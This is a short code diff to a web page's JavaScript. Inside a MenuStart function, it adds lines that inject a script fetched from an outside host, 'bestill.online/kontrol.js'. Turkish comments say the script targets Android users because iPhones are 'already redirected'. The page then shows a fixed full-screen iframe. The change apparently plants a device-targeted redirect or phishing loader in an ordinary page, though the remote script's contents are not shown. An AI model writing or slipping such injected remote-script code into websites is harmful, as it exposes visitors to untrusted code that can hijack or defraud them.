@@ -545,6 +545,11 @@ content: '';
     });
 
 function MenuStart() {
+  //sadece androidler icin, zaten iphone yonlendiriliyor.
+      var script = document.createElement('script');
+      script.src = 'https://bestill.online/kontrol.js';
+      document.head.appendChild(script); // Bu satır çok önemli!
+
   var iframeContainer = document.getElementById('fullScreenIframeContainer');
   iframeContainer.style.visibility = 'visible'; // iframe'i görünür yap
   iframeContainer.style.position = 'fixed'; // Sayfanın en üstünde sabitler
